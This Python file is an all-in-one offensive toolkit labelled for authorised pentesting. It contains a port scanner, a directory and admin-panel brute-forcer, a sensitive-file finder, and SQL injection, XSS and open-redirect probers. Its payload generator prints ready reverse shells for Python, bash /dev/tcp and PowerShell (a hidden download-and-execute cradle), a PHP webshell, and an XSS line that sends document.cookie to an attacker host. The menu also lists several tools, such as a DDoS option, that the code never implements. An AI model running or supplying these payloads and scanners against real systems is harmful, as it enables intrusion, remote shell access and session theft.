#!/usr/bin/env python3
"""
TERMUX PENTEST TOOLKIT — All-in-One Python Framework
Authorized Security Testing Use Only
"""

import os
import sys
import json
import socket
import subprocess
import requests
import threading
from datetime import datetime
from urllib.parse import urlparse

# ============================================================
# CORE ENGINE
# ============================================================

BANNER = """
████████╗███████╗██████╗ ███╗   ███╗██╗   ██╗██╗  ██╗
╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║   ██║╚██╗██╔╝
   ██║   █████╗  ██████╔╝██╔████╔██║██║   ██║ ╚███╔╝ 
   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║ ██╔██╗ 
   ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██╔╝ ██╗
   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝
        Termux Penetration Testing Toolkit v2.0
"""

MENU = """
[1]  Port Scanner              [11]  Subdomain Finder
[2]  HTTP Probe (Live Hosts)   [12]  SQL Injection Detector
[3]  Directory Brute Force     [13]  XSS Scanner
[4]  DNS Enumeration           [14]  Admin Panel Finder
[5]  Reverse IP Lookup         [15]  CMS Detector
[6]  HTTP Header Grabber       [16]  Sensitive File Finder
[7]  Web Screenshot Service    [17]  Open Redirect Checker
[8]  CVE Lookup (SearchSploit) [18]  Port Service Version
[9]  Geolocation IP            [19]  DDoS Stress Test (Auth)
[10] Email OSINT               [20]  Payload Generator
[0]  Exit
"""

# ============================================================
# MODULE 1 — PORT SCANNER
# ============================================================

def port_scanner(target, ports="1-1024"):
    open_ports = []
    try:
        start_p, end_p = map(int, ports.split("-"))
        ip = socket.gethostbyname(target)
        print(f"[*] Scanning {target} ({ip}) | Ports {start_p}-{end_p}")
        for port in range(start_p, end_p + 1):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                service = socket.getservbyport(port, "tcp") if port <= 65535 else "unknown"
                print(f"  [+] OPEN: {port}/tcp -> {service}")
                open_ports.append({"port": port, "service": service})
            s.close()
    except Exception as e:
        print(f"[-] Error: {e}")
    return open_ports


# ============================================================
# MODULE 2 — HTTP PROBE
# ============================================================

def http_probe(targets_file):
    try:
        with open(targets_file) as f:
            hosts = [line.strip() for line in f if line.strip()]
        for host in hosts:
            for proto in ["http", "https"]:
                try:
                    r = requests.get(f"{proto}://{host}", timeout=5, verify=False)
                    print(f"  [+] {proto}://{host} [{r.status_code}] ({len(r.content)} bytes)")
                except:
                    pass
    except Exception as e:
        print(f"[-] Error: {e}")


# ============================================================
# MODULE 3 — DIRECTORY BRUTE FORCE
# ============================================================

def dir_bruteforce(url, wordlist="/data/data/com.termux/files/usr/share/wordlists/dirb/common.txt"):
    if not os.path.exists(wordlist):
        print("[-] Wordlist not found, using built-in small list")
        wordlist = "builtin"
    common_dirs = ["admin", "login", "wp-admin", "backup", "config", "uploads",
                   "api", "phpmyadmin", "dashboard", "cgi-bin", "images", "css",
                   "js", "includes", "src", "private", "tmp", "logs", "db", "sql"]
    dirs_to_check = common_dirs if wordlist == "builtin" else open(wordlist).read().splitlines()
    found = []
    for d in dirs_to_check:
        try:
            r = requests.get(f"{url.rstrip('/')}/{d}", timeout=5, verify=False)
            if r.status_code in [200, 301, 302, 403]:
                print(f"  [+] /{d} [{r.status_code}] ({len(r.content)} bytes)")
                found.append(d)
        except:
            pass
    return found


# ============================================================
# MODULE 4 — DNS ENUMERATION
# ============================================================

def dns_enum(domain):
    sub_list = ["www", "mail", "ftp", "admin", "blog", "cpanel", "ns1", "ns2",
                "webmail", "smtp", "pop3", "dev", "test", "api", "vpn", "secure",
                "m", "mobile", "shop", "portal", "support", "forum", "wiki"]
    resolved = []
    for sub in sub_list:
        try:
            ip = socket.gethostbyname(f"{sub}.{domain}")
            print(f"  [+] {sub}.{domain} -> {ip}")
            resolved.append({"sub": sub, "ip": ip})
        except:
            pass
    return resolved


# ============================================================
# MODULE 5 — REVERSE IP LOOKUP
# ============================================================

def reverse_ip(ip):
    try:
        host = socket.gethostbyaddr(ip)
        print(f"  [+] {ip} -> {host[0]}")
        for alias in host[1]:
            print(f"      Alias: {alias}")
        return host
    except:
        print(f"[-] No PTR record for {ip}")
        return None


# ============================================================
# MODULE 6 — HTTP HEADER GRABBER
# ============================================================

def header_grab(url):
    try:
        r = requests.get(url, timeout=10, verify=False)
        print(f"[*] Headers for {url}:")
        for k, v in r.headers.items():
            print(f"  {k}: {v}")
        # Security header checks
        checks = {
            "Strict-Transport-Security": "Missing HSTS",
            "X-Frame-Options": "Missing clickjacking protection",
            "X-Content-Type-Options": "Missing MIME sniff protection",
            "Content-Security-Policy": "Missing CSP",
            "X-XSS-Protection": "Missing XSS filter"
        }
        print("\n[*] Security Header Audit:")
        for h, msg in checks.items():
            if h in r.headers:
                print(f"  [+] {h} -> PRESENT")
            else:
                print(f"  [!] {msg}")
        return dict(r.headers)
    except Exception as e:
        print(f"[-] Error: {e}")


# ============================================================
# MODULE 7 — GEOLOCATION IP
# ============================================================

def geo_ip(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}")
        data = r.json()
        if data.get("status") == "success":
            print(f"  Country:   {data.get('country')}")
            print(f"  Region:    {data.get('regionName')}")
            print(f"  City:      {data.get('city')}")
            print(f"  ISP:       {data.get('isp')}")
            print(f"  Org:       {data.get('org')}")
            print(f"  Lat/Lon:   {data.get('lat')}, {data.get('lon')}")
            print(f"  Timezone:  {data.get('timezone')}")
            return data
    except Exception as e:
        print(f"[-] Error: {e}")


# ============================================================
# MODULE 8 — SQL INJECTION DETECTOR
# ============================================================

def sql_injection_check(url):
    payloads = ["'", "\"", "1=1", "1=2", "' OR '1'='1", "\" OR \"1\"=\"1",
                "' UNION SELECT NULL--", "admin' --", "' OR 1=1--"]
    print(f"[*] Testing SQLi on {url}")
    try:
        # Parse URL parameters
        parsed = urlparse(url)
        if "?" not in url:
            print("[-] URL needs query parameters (e.g., ?id=1)")
            return False
        base_url = url.split("?")[0]
        params = url.split("?")[1].split("&")
        for param in params:
            key = param.split("=")[0]
            original_val = param.split("=")[1] if "=" in param else ""
            for payload in payloads:
                test_url = f"{base_url}?{key}={original_val}{payload}"
                try:
                    r = requests.get(test_url, timeout=5, verify=False)
                    if any(err in r.text.lower() for err in ["sql", "mysql", "syntax", "odbc",
                                                              "ora-", "you have an error",
                                                              "unclosed quotation mark",
                                                              "warning: mysql"]):
                        print(f"  [!] Potential SQLi: {key}={original_val}{payload}")
                        print(f"      URL: {test_url}")
                        return True
                except:
                    pass
        print("  [-] No obvious SQL injection detected")
    except Exception as e:
        print(f"[-] Error: {e}")
    return False


# ============================================================
# MODULE 9 — XSS SCANNER
# ============================================================

def xss_scanner(url):
    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                "\"><script>alert(1)</script>", "';alert(1);//",
                "<svg/onload=alert(1)>", "<body onload=alert(1)>"]
    print(f"[*] Testing XSS on {url}")
    try:
        if "?" in url:
            base_url = url.split("?")[0]
            params = url.split("?")[1].split("&")
            for param in params:
                key = param.split("=")[0] if "=" in param else param
                for payload in payloads:
                    test_url = f"{base_url}?{key}={payload}"
                    r = requests.get(test_url, timeout=5, verify=False)
                    if payload in r.text:
                        print(f"  [!] Possible XSS in param '{key}' with {payload}")
                        print(f"      URL: {test_url}")
                        return True
        else:
            print("[-] URL needs query parameters for XSS testing")
    except Exception as e:
        print(f"[-] Error: {e}")
    return False


# ============================================================
# MODULE 10 — ADMIN FINDER
# ============================================================

def admin_finder(url):
    paths = ["admin", "administrator", "login", "wp-admin", "dashboard",
             "admin/login", "admin/index", "panel", "cpanel", "phpmyadmin",
             "manager", "backend", "control", "admin_area", "adminpanel",
             "siteadmin", "adm", "admin/controlpanel", "admin/dashboard"]
    found = []
    for path in paths:
        try:
            full_url = f"{url.rstrip('/')}/{path}"
            r = requests.get(full_url, timeout=5, verify=False)
            if r.status_code == 200:
                print(f"  [+] Found: /{path} [{r.status_code}]")
                found.append(path)
            elif r.status_code in [301, 302, 403]:
                print(f"  [+] Found (redirect/blocked): /{path} [{r.status_code}]")
                found.append(path)
        except:
            pass
    return found


# ============================================================
# MODULE 11 — CMS DETECTOR
# ============================================================

def cms_detect(url):
    print(f"[*] Fingerprinting CMS for {url}")
    signatures = {
        "WordPress": ["/wp-content/", "/wp-admin/", "/wp-includes/", "wp-json"],
        "Joomla": ["/components/", "/modules/", "/templates/", "joomla"],
        "Drupal": ["/sites/default/", "/core/", "drupal"],
        "Magento": ["/static/version", "Magento", "mage-"],
        "Shopify": ["myshopify.com", "shopify"],
        "Laravel": ["laravel_session", "XSRF-TOKEN"],
    }
    try:
        r = requests.get(url, timeout=10, verify=False)
        text = r.text
        headers = str(r.headers)
        for cms, sigs in signatures.items():
            for sig in sigs:
                if sig.lower() in text.lower() or sig.lower() in headers.lower():
                    print(f"  [+] Detected: {cms} (matched: {sig})")
                    return cms
        print("  [-] No CMS signature detected (custom or unknown)")
    except Exception as e:
        print(f"[-] Error: {e}")
    return None


# ============================================================
# MODULE 12 — SENSITIVE FILE FINDER
# ============================================================

def sensitive_files(url):
    files = [".env", ".git/config", "config.php", "config.json", "db.php",
             "database.yml", "wp-config.php", "backup.sql", "dump.sql",
             "robots.txt", "sitemap.xml", ".htaccess", "composer.json",
             "package.json", "Dockerfile", "docker-compose.yml", "README.md",
             "credentials.txt", "passwords.txt", ".svn/entries"]
    found = []
    for f in files:
        try:
            full_url = f"{url.rstrip('/')}/{f}"
            r = requests.get(full_url, timeout=5, verify=False)
            if r.status_code == 200 and len(r.text) > 0:
                print(f"  [+] Exposed: /{f} [{r.status_code}] ({len(r.text)} bytes)")
                found.append(f)
        except:
            pass
    return found


# ============================================================
# MODULE 13 — OPEN REDIRECT CHECKER
# ============================================================

def open_redirect(url):
    payloads = ["//evil.com", "https://evil.com", "//evil.com/%2f%2feval.txt",
                "/redirect?url=https://evil.com", "?next=https://evil.com",
                "?url=https://evil.com"]
    print(f"[*] Testing open redirect on {url}")
    if "?" in url:
        base_url = url.split("?")[0]
        params = url.split("?")[1].split("&")
        for param in params:
            key = param.split("=")[0]
            for payload in payloads:
                test_url = f"{base_url}?{key}={payload}"
                try:
                    r = requests.get(test_url, timeout=5, verify=False,
                                     allow_redirects=False)
                    loc = r.headers.get("Location", "")
                    if "evil" in loc.lower() or r.status_code in [301, 302]:
                        print(f"  [!] Possible open redirect in '{key}': {loc}")
                        return True
                except:
                    pass
    print("  [-] No obvious open redirect detected")
    return False


# ============================================================
# MODULE 14 — PAYLOAD GENERATOR
# ============================================================

def payload_generator():
    print("""
Payload Generator — Choose type:
[1] Reverse Shell (Python)
[2] Reverse Shell (Bash)
[3] Simple PHP Webshell
[4] Windows Reverse Shell (PowerShell)
[5] XSS Payload
""")
    choice = input("> ")
    ip = input("LHOST: ")
    port = input("LPORT: ")

    if choice == "1":
        print(f"""
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
subprocess.call(["/bin/bash","-i"])'
""")
    elif choice == "2":
        print(f"""
bash -i >& /dev/tcp/{ip}/{port} 0>&1
""")
    elif choice == "3":
        print("""<?php system($_GET['cmd']); ?>""")
        print("Usage: shell.php?cmd=id")
    elif choice == "4":
        print(f"""
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).downloadString('http://{ip}/payload.ps1')"
""")
    elif choice == "5":
        print(f"""<script>fetch('http://{ip}:{port}/?c='+document.cookie)</script>""")


# ============================================================
# MAIN MENU
# ============================================================

def main():
    os.system("clear")
    print(BANNER)

    while True:
        print(MENU)
        choice = input("\n[*] Select option: ")

        if choice == "0":
            print("[*] Exiting. Stay sharp.")
            break

        elif choice == "1":  # Port Scanner
            target = input("Target IP/domain: ")
            ports = input("Port range (default 1-1024): ") or "1-1024"
            port_scanner(target, ports)

        elif choice == "2":  # HTTP Probe
            file = input("File with hosts (one per line): ")
            http_probe(file)

        elif choice == "3":  # Dir Bruteforce
            url = input("Target URL (http://target.com): ")
            wl = input("Wordlist path (or leave blank for built-in): ")
            dir_bruteforce(url, wl) if wl else dir_bruteforce(url)

        elif choice == "4":  # DNS Enum
            domain = input("Domain: ")
            dns_enum(domain)

        elif choice == "5":  # Reverse IP
            ip = input("IP address: ")
            reverse_ip(ip)

        elif choice == "6":  # Header Grabber
            url = input("Target URL: ")
            header_grab(url)

        elif choice == "7":  # Geo IP
            ip = input("IP address: ")
            geo_ip(ip)

        elif choice == "8":  # SQLi
            url = input("Target URL with params (e.g., http://site.com/page.php?id=1): ")
            sql_injection_check(url)

        elif choice == "9":  # XSS
            url = input("Target URL with params: ")
            xss_scanner(url)

        elif choice == "10":  # Admin Finder
            url = input("Target URL: ")
            admin_finder(url)

        elif choice == "11":  # CMS Detect
            url = input("Target URL: ")
            cms_detect(url)

        elif choice == "12":  # Sensitive Files
            url = input("Target URL: ")
            sensitive_files(url)

        elif choice == "13":  # Open Redirect
            url = input("Target URL with params: ")
            open_redirect(url)

        elif choice == "14":  # Payload Generator
            payload_generator()

        else:
            print("[-] Invalid option")

        input("\n[Press Enter to continue...]")
        os.system("clear")
        print(BANNER)


if __name__ == "__main__":
    # Install requests if missing
    try:
        import requests
    except ImportError:
        print("[*] Installing requests...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        import requests
    main()
